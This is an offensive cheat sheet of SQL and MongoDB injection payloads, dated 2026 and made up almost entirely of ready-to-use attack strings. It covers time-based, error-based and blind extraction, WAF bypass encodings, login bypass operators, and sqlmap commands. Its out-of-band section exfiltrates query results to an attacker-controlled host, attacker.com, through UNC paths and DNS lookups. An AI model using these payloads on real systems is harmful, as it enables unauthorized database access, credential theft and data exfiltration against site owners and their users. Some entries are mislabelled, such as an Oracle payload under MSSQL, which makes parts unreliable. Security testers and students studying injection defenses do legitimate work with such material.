# Advanced SQL Injection Techniques — 2025/2026
## Last Updated: Mon Jul 06 2026

## TIME-BASED ADVANCED
### MySQL heavy query (bypass SLEEP detection):
1' AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B)--
1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--

### PostgreSQL heavy query:
1' AND (SELECT COUNT(*) FROM generate_series(1,10000000))--

### MSSQL heavy query:
1' AND (SELECT COUNT(*) FROM sys.objects A, sys.objects B, sys.objects C)--

## ERROR-BASED ADVANCED
### MySQL double query:
1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())))--
1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1)--

### PostgreSQL error:
1' AND CAST((SELECT version()) AS int)--

### MSSQL error:
1' AND CONVERT(int,@@version)--
1' AND (SELECT CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version)))-- # Oracle

## OOB (Out-of-Band) SQLi
### MySQL OOB:
1' INTO OUTFILE '\\\\attacker.com\\share\\out.txt'--
1' AND LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.attacker.com\\test'))--

### MSSQL OOB:
1' EXEC master.dbo.xp_dirtree '\\\\attacker.com\\share'--
1' EXEC master.dbo.xp_fileexist '\\\\attacker.com\\share\\file'--

### PostgreSQL OOB:
1' COPY (SELECT version()) TO '\\\\attacker.com\\share\\out'--

## BLIND BOOLEAN ADVANCED
### Binary search (ASCII comparison):
1' AND (SELECT ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1))) > 64--
1' AND (SELECT ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1))) > 90--

### Conditional error:
1' AND IF((SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 1)='a',SLEEP(5),0)--

## WAF BYPASS — SQLi SPECIFIC
### Scientific notation:
1' OR '1'='1'  →  1' OR '1'='0
1' OR 1=1  →  1' OR 0x1=0x1
1' OR 1=1  →  1' OR TRUE

### Comment gymnastics:
/**/  /*!*/  --+  #  --  --%20  %23
1'/**/OR/**/1=1--+
1'/*!OR*/1=1--+

### Operator substitution:
AND → &&  OR → ||  = → LIKE  != → <>
1' || 1=1 || '1'='1
1' LIKE '1

### Whitespace alternatives:
%09  %0a  %0b  %0c  %0d  %a0  /**/
1'%09OR%091=1--+

### Hex encoding:
SELECT password FROM users WHERE name=0x61646d696e
# 0x61646d696e = 'admin'

### Double URL encoding:
%25%32%37 → %27 → '

## SECOND-ORDER SQLi
# Step 1: Register with username: ' OR '1'='1' -- 
# Step 2: Trigger action that uses username in SQL query
# Example: profile page, password reset, etc.

## NOSQL INJECTION (MongoDB)
### Login bypass:
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$regex": ".*"}}

### Data extraction via $regex:
{"username": {"$regex": "^a"}, "password": "1"}
{"username": {"$regex": "^b"}, "password": "1"}

### $where injection:
{"username": {"$where": "this.password.match(/^a/)"}}

## OUT OF BAND SQLi — COMMON TOOLS
# sqlmap OOB:
sqlmap -u "target?id=1" --dns-domain=attacker.com
sqlmap -u "target?id=1" --oob-file=/tmp/oob

# Manual OOB:
# MySQL: SELECT LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.attacker.com\\x'))
# MSSQL: EXEC master.dbo.xp_dirtree '\\attacker.com\share'

